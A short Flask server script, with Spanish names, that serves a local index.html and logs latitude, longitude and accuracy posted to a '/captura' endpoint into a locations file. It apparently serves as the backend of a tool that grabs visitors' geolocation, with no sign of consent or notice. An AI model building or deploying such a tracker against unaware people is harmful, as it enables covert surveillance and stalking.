from flask import Flask, request, send_from_directory
import datetime

app = Flask(__name__)

@app.route('/captura', methods=['POST'])
def captura():
    data = request.get_json()
    with open("ubicaciones.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - LAT: {data['lat']}, LON: {data['lon']}, ACC: {data['acc']}m\n")
    return 'OK', 200

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
